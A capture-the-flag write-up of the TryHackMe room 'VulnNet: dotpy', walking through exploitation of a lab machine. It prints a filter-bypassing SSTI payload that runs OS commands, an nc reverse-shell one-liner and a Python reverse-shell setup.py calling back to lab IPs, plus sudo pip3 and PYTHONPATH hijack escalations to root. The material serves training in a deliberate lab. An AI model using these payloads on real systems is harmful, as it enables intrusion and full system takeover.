# VulnNet: dotpy

https://tryhackme.com/room/vulnnetdotpy

A *very* python centric room, as it says on the tin, but relatively straight forward. It helped that the initial foothold was the same as another recent room.

1. A scan revealed only one port was open, 8080. Going to this revealed a slick website that you could register and log into, but with no apparent functionality.
2. I tried robots.txt which dropped me to a 404 page, but *showing* 403 and 'bad characters detected'. Hmm. Browing to /test revealed a proper 404 page, showing 'test' in the body. This smelled like SSTI, and it was! Browsing to `/{{7*7}}` showed `49` in the page body.
3. A quick test (`{{7*'7'}}`) showed the framework was probably twig. Of more immediate concern was the blacklisting of `.` and I guess other characters, which would make exploiting difficult. Unfortunately for the room, the challenge was identical to the foot hold in [keldagrim](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme/keldagrim.md), right down to the same payload working:

Here is a injection payload with no periods or other easily blocked characters:

`/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

Putting that in the page returned the id of the user web. Next I used the standard reverse nc binder like `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.176.61 4444 >/tmp/f`, but hex encoded it with '\x' as a seperator, easy with CyberChef, and dropped this in place of `id`. Boom, I had a reverse shell.

4. As `web` I ran sudo -l and found that they could run `/usr/bin/pip3 install *` as the user `system-adm`. With gtfo-bins as a guide, to exploit this, I created a new folder `/tmp/pe`, and put a setup.py file in there containing a reverse shell binder like: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`. I then ran `sudo -u system-adm /usr/bin/pip3 install /tmp/pe` and shortly thereafter had a reverse shell as `system-adm`, and the first flag.

5. sudo -l on system-adm revealed: `(ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py`. This looked and smelled like a python hijack, since that SETENV would allow me to specify PYTHONPATH for importing. Checking /opt/backup.py (which I could read but do nothing else to) it ran 'import zipfile'. Accordingly I created a zipfile.py that contained `import pty; pty.spawn("/bin/bash")`, placed that in /tmp, then ran `sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py` and boom: root shell and the root flag :)

Fun room to take to pieces :)
